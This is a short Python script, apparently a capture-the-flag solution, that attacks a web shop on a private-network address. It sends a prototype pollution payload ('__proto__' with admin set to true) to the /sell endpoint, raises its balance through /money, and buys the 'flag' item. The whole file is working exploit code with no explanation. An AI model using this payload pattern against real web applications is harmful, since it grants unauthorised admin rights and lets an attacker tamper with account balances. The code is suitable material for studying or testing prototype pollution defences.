import requests

s = requests.Session()

print(s.post('http://192.168.1.4:8080/sell', json={'__proto__': {'admin': 'true'}, 'xiaomi': { 'quantity': 1 }}).text)
print(s.post('http://192.168.1.4:8080/money',json={ 'money': 10000 }).text)
# print(s.get('http://192.168.1.4:8080/').text)
print(s.post('http://192.168.1.4:8080/buy', json={ 'phone': 'flag', 'quantity': 1 } ).text)